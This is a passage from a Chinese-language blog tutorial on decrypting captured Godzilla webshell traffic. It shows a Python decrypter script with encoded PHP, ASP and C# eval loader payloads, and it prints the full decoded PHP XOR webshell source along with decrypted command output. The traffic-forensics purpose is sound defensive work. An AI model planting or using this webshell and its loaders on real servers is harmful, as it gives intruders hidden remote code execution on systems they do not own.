decrypter.decrypt_req_payload(b&#x27;pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # exit()</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = JAVA_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # java_raw_req = &#x27;d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&#x27;</span><br><span class=\"line\">    # java_raw_res = &#x27;2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = JAVA_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&#x27;pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">        b&#x27;11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6ab2s=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;methodName\\x02\\x04\\x00\\x00\\x00test&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;ok&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_EVAL_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&amp;key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;828130b2s=20ebbc&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6aDF0=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asp_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    asp_xor_raw_res = &#x27;0c5d&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(b&#x27;pass=&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_EVAL_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(</span><br><span class=\"line\">    #     b&#x27;pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&amp;key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">    #     b&#x27;72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = CSHAP_ASMX_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asmx_req = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">    &lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class=\"line\">      &lt;soap:Body&gt;</span><br><span class=\"line\">        &lt;pass xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class=\"line\">          &lt;pass&gt;WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&lt;/pass&gt;</span><br><span class=\"line\">        &lt;/pass&gt;</span><br><span class=\"line\">      &lt;/soap:Body&gt;</span><br><span class=\"line\">    &lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    asmx_res = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(asmx_req)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(asmx_res)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    # decrypter = CSHAP_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # cshap_aes_raw_req=&#x27;5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68&#x27;</span><br><span class=\"line\">    # cshap_aes_raw_res = &#x27;09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br></pre></td></tr></table></figure></p>\n<p>找到如下模块并写入自己抓取流量包的数据（注意代码前方的缩进）<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YgxVz9UGNO1EI7iG.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TKeBzCkFRK0nZYVX.png!thumbnail\" alt=\"\" /></p>\n<p>运行能够看到解密出来的代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E53uurH7zQWXkpa1.png!thumbnail\" alt=\"\" /></p>\n<p>给它整理一下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K) &#123;</span><br><span class=\"line\">\tfor ($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">\t\t$c = $K[$i+1&amp;15];</span><br><span class=\"line\">\t\t$D[$i] = $D[$i]^$c;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;key&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass])) &#123;</span><br><span class=\"line\">\t$data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">\tif (isset($_SESSION[$payloadName])) &#123;</span><br><span class=\"line\">\t\t$payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">\t\tif (strpos($payload,&quot;getBasicsInfo&quot;)===false) &#123;</span><br><span class=\"line\">\t\t\t$payload=encode($payload,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tteval($payload);</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">\t\techo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),16);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tif (strpos($data,&quot;getBasicsInfo&quot;)!==false) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到这便是 PHP 的加密脚本，把解密脚本中的 exit () 给注释掉，重新运行，能够看到终端返回的数据<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cDj4Klwx7PvggCh2.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>在这里能够看到是我们输入了命令 ls 之后的回显，切换另一个流试试</p>\n<p>tcp 流 32：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wA5tuDksQN35qidX.png!thumbnail\" alt=\"\" /></p>\n<p>将对应的数据填入脚本当中，运行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MS0bzMoV5f6yrg4E.png!thumbnail\" alt=\"\" /></p>\n<p>能够看到回显出了根目录底下的文件，便是 ls / 命令的回显</p>\n<p>接下来将加密器切换成 PHP_XOR_BASE64 重新上传抓包</p>\n<p>先看看它生成的马</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K)&#123;</span><br><span class=\"line\">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">        $c = $K[$i+1&amp;15];</span><br><span class=\"line\">        $D[$i] = $D[$i]^$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;pass&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass]))&#123;</span><br><span class=\"line\">    $data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class=\"line\">        $payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;</span><br><span class=\"line\">            $payload=encode($payload,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        eval($payload);</span><br><span class=\"line\">        echo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">        echo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">        echo substr(md5($pass.$key),16);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class=\"line\">            $_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再来看看流量包的追踪流<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/79qMzmBEXGPmxwbd.png!thumbnail\" alt=\"\" title=\"fig:\" 